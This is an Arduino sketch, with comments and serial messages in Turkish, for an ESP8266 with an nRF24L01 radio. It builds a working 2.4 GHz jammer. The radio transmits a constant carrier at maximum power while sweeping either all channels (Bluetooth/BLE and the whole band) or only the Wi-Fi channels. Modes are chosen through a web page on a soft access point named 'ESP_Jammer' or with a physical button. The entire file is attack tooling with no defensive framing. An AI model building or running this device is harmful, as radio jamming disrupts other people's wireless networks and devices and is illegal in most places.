#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <SPI.h>
#include <RF24.h>

// nRF24L01 pinleri (NodeMCU ESP8266 için)
RF24 radio(D4, D8); // CE, CSN

ESP8266WebServer server(80);

const int wifiFrequencies[] = {2412, 2417, 2422, 2427, 2432, 2437, 2442, 2447, 2452, 2457, 2462};

volatile uint8_t attack_type = 2; // 0: full, 1: wifi, 2: idle
volatile bool buttonPressed = false;
volatile bool fullJammerActive = false;
unsigned long lastDebounceTime = 0;
unsigned long debounceDelay = 200;

String htmlPage() {
  String page = "<html><head><title>ESP8266 Jammer</title></head><body style='font-family: sans-serif; text-align:center;'>";
  page += "<h1>ESP8266 + nRF24L01 Jammer</h1>";
  page += "<p>Aktif Mod: " + String((attack_type==0)?"BLE & All 2.4GHz":(attack_type==1)?"Just Wi-Fi":"Idle") + "</p>";
  page += "<p>Buton Durumu: " + String(fullJammerActive?"Full Jammer AÇIK":"Full Jammer KAPALI") + "</p>";
  page += "<form action='/set' method='GET'>";
  page += "<button name='mode' value='0'>BLE & All 2.4GHz</button><br><br>";
  page += "<button name='mode' value='1'>Just Wi-Fi</button><br><br>";
  page += "<button name='mode' value='2'>Idle</button>";
  page += "</form></body></html>";
  return page;
}

void handleRoot() {
  server.send(200, "text/html", htmlPage());
}

void handleSet() {
  if (server.hasArg("mode")) {
    attack_type = server.arg("mode").toInt();
  }
  server.sendHeader("Location", "/");
  server.send(303);
}

void fullAttack() {
  for (uint8_t i = 0; i < 80; i++) {
    radio.setChannel(i);
  }
}

void wifiAttack() {
  for (uint8_t i = 0; i < sizeof(wifiFrequencies)/sizeof(wifiFrequencies[0]); i++) {
    radio.setChannel(wifiFrequencies[i] - 2400);
  }
}

void ICACHE_RAM_ATTR handleButtonInterrupt() {
  if ((millis() - lastDebounceTime) > debounceDelay) {
    buttonPressed = true;
    lastDebounceTime = millis();
  }
}

void setup() {
  Serial.begin(9600);
  delay(100);

  pinMode(D3, INPUT_PULLUP);
  attachInterrupt(digitalPinToInterrupt(D3), handleButtonInterrupt, FALLING);

  if (!radio.begin()) {
    Serial.println("RF24 baslatilamadi!");
    while(1);
  }

  radio.setAutoAck(false);
  radio.stopListening();
  radio.setPayloadSize(5);
  radio.setAddressWidth(3);
  radio.setPALevel(RF24_PA_MAX);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.startConstCarrier(RF24_PA_MAX, 45);

  WiFi.softAP("ESP_Jammer", "12345678");
  Serial.println("WiFi AP acildi: ESP_Jammer");

  server.on("/", handleRoot);
  server.on("/set", handleSet);
  server.begin();
}

void loop() {
  server.handleClient();

  if (buttonPressed) {
    buttonPressed = false;
    fullJammerActive = !fullJammerActive;
    if (fullJammerActive) {
      attack_type = 0; // Full jammer modu
      Serial.println("Full Jammer AÇIK");
    } else {
      attack_type = 2; // Idle modu
      Serial.println("Full Jammer KAPALI");
    }
  }

  switch (attack_type) {
    case 0: fullAttack(); break;
    case 1: wifiAttack(); break;
    case 2: /* idle */ break;
  }
}
